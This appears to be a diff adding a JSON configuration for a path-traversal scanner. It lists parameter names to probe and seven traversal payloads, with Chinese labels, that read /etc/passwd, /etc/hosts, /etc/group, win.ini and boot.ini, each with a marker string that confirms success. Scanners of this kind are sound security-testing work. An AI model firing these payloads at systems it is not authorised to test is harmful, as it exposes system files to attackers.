@@ -1,0 +1,16 @@
+{
+  "path_params": [
+    "file", "path", "filename", "filepath", "page", "view", "template",
+    "document", "download", "read", "open", "content", "source", "inc",
+    "include", "folder", "dir", "attach", "load", "name"
+  ],
+  "payloads": [
+    {"id": "passwd", "name": "正斜杠穿越读取 /etc/passwd", "template": "../../../../../../etc/passwd", "check": "root:"},
+    {"id": "passwd-dotslash", "name": "....// 绕过穿越读取 /etc/passwd", "template": "....//....//....//....//etc/passwd", "check": "root:"},
+    {"id": "hosts", "name": "穿越读取 /etc/hosts", "template": "../../../../../../etc/hosts", "check": "localhost"},
+    {"id": "group", "name": "穿越读取 /etc/group", "template": "../../../../../../etc/group", "check": "root:"},
+    {"id": "win-ini", "name": "Windows 反斜杠穿越读取 win.ini", "template": "..\\..\\..\\..\\windows\\win.ini", "check": "for 16-bit"},
+    {"id": "win-ini-fwd", "name": "Windows 正斜杠穿越读取 win.ini", "template": "../../../../../../windows/win.ini", "check": "for 16-bit"},
+    {"id": "boot-ini", "name": "Windows 穿越读取 boot.ini", "template": "../../../../../../boot.ini", "check": "[boot loader]"}
+  ]
+}
